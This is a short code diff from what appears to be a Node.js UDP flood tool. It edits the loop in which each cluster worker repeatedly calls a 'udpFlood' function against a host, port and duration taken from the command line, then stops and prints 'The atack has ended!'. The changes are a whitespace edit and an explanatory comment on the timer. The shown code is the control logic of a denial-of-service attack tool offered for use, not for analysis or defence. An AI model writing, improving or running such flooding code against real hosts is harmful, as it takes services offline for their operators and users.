@@ -58,12 +58,12 @@ if (cluster.isPrimary) {
             let flood = setInterval(() => {
                 udpFlood(process.argv[2], parseInt(process.argv[3]), parseInt(process.argv[4]));
             });
-
+            
             setTimeout(() => {
                 clearInterval(flood);
                 console.log("The atack has ended!\n");
                 process.exit(1);
-            }, process.argv[4] * 1000);
+            }, process.argv[4] * 1000); // normally, this is ms, we converted it to seconds. setTimeout() clears the interval, and ends the attack per thread.
         }
     });
 }
